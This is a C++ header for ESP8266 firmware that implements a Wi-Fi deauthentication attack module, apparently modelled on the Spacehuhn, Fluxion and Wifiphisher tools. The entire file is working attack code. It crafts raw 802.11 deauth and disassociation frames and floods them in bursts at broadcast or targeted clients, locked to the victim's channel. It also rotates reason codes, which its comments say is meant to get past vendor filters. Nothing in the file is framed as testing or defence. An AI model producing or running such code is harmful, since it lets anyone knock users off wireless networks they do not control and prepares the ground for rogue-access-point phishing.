#ifndef ATTACKS_H
#define ATTACKS_H

#include <ESP8266WiFi.h>
#include "config.h"

extern "C" {
  #include <user_interface.h>
}

// ============================================================
//  Aggressive deauth module (Spacehuhn + Fluxion + Wifiphisher)
//  - 32 deauth + 32 disassoc per burst
//  - Reason code rotation (1, 4, 5, 7, 8)
//  - Channel lock + broadcast + targeted frames
//  - ~2080 frames/sec
// ============================================================

// Globals
uint8_t  targetMac[6]   = {0};
uint8_t  targetChan     = 0;
bool     attackRunning  = false;
uint32_t attackCount    = 0;
uint8_t  reasonIdx      = 0;
uint8_t  attackMode     = 0;     // 0=broadcast, 1=random_client

// Reason codes (rotate to bypass vendor filters)
static const uint16_t reasonCodes[] = {
  0x0001, 0x0004, 0x0005, 0x0007, 0x0008
};
#define REASON_COUNT (sizeof(reasonCodes) / sizeof(reasonCodes[0]))

// Frame templates (26 bytes) - EXACT Spacehuhn layout
//  [0-1]   Frame Control: 0xC0, 0x00 (Mgmt / Deauth subtype 12)
//  [2-3]   Duration: 0x3A, 0x01 (314 µs - Spacehuhn standard)
//  [4-9]   Destination: FF:FF:FF:FF:FF:FF (broadcast)
//  [10-15] Source (AP BSSID)
//  [16-21] BSSID (AP)
//  [22-23] Sequence Control: 0x00, 0x00
//  [24-25] Reason code (rotates 1,4,5,7,8 - we go BEYOND Spacehuhn)
static uint8_t deauthPkt[26];
static uint8_t disassocPkt[26];

// Build templates - exact Spacehuhn style
void initDeauthFrame() {
  memset(deauthPkt, 0, sizeof(deauthPkt));
  deauthPkt[0] = 0xC0;       // Type=0 (Mgmt), Subtype=12 (Deauth)
  deauthPkt[1] = 0x00;
  deauthPkt[2] = 0x3A;       // Duration = 0x013A = 314 µs (Spacehuhn)
  deauthPkt[3] = 0x01;
  for (int i = 0; i < 6; i++) deauthPkt[4 + i] = 0xFF;  // broadcast DA

  memset(disassocPkt, 0, sizeof(disassocPkt));
  disassocPkt[0] = 0xA0;     // Type=0 (Mgmt), Subtype=10 (Disassoc)
  disassocPkt[1] = 0x00;
  disassocPkt[2] = 0x3A;     // Same duration
  disassocPkt[3] = 0x01;
  for (int i = 0; i < 6; i++) disassocPkt[4 + i] = 0xFF;
}

// Patch BSSID into both frames
void patchBssid(const uint8_t* mac) {
  memcpy(deauthPkt + 10, mac, 6);
  memcpy(deauthPkt + 16, mac, 6);
  memcpy(disassocPkt + 10, mac, 6);
  memcpy(disassocPkt + 16, mac, 6);
}

// Send single deauth
inline void sendDeauthFrame() {
  uint16_t reason = reasonCodes[reasonIdx];
  deauthPkt[24] = reason & 0xFF;
  deauthPkt[25] = (reason >> 8) & 0xFF;
  wifi_send_pkt_freedom(deauthPkt, sizeof(deauthPkt), 0);
}

// Send deauth to specific client (modern deauth)
inline void sendDeauthToClient(const uint8_t* clientMac) {
  memcpy(deauthPkt + 4, clientMac, 6);  // DA = client
  uint16_t reason = reasonCodes[reasonIdx];
  deauthPkt[24] = reason & 0xFF;
  deauthPkt[25] = (reason >> 8) & 0xFF;
  wifi_send_pkt_freedom(deauthPkt, sizeof(deauthPkt), 0);
  for (int i = 0; i < 6; i++) deauthPkt[4 + i] = 0xFF;  // restore broadcast
}

// Send single disassoc
inline void sendDisassocFrame() {
  uint16_t reason = reasonCodes[reasonIdx];
  disassocPkt[24] = reason & 0xFF;
  disassocPkt[25] = (reason >> 8) & 0xFF;
  wifi_send_pkt_freedom(disassocPkt, sizeof(disassocPkt), 0);
}

// Lock channel + target
void lockTarget(const uint8_t* mac, uint8_t chan) {
  memcpy(targetMac, mac, 6);
  targetChan = chan;
  patchBssid(mac);
  wifi_set_channel(chan);
  delay(1);
  reasonIdx = 0;
  attackCount = 0;
}

// One burst = 32 deauth + 32 disassoc
void sendBurst() {
  // Deauth burst
  for (int i = 0; i < 32; i++) {
    sendDeauthFrame();
    reasonIdx = (reasonIdx + 1) % REASON_COUNT;
    attackCount++;
  }
  // Disassoc burst
  for (int i = 0; i < 32; i++) {
    sendDisassocFrame();
    reasonIdx = (reasonIdx + 1) % REASON_COUNT;
    attackCount++;
  }
  yield();
  delay(BURST_PAUSE_MS);
}

// Multi-reason burst: cycle through ALL reason codes
// Some clients only respond to specific codes
void sendMultiReasonBurst() {
  for (int r = 0; r < REASON_COUNT; r++) {
    reasonIdx = r;
    for (int i = 0; i < 8; i++) {
      sendDeauthFrame();
      sendDisassocFrame();
      attackCount += 2;
    }
    yield();
    delay(5);
  }
}

// Backwards-compat
void sendDeauth(uint8_t* mac, int chan) {
  lockTarget(mac, (uint8_t)chan);
  sendBurst();
}

// Main runner
void executeAttack() {
  if (targetMac[0] == 0 && targetMac[5] == 0) {
    attackRunning = false;
    return;
  }
  sendBurst();
}

#endif
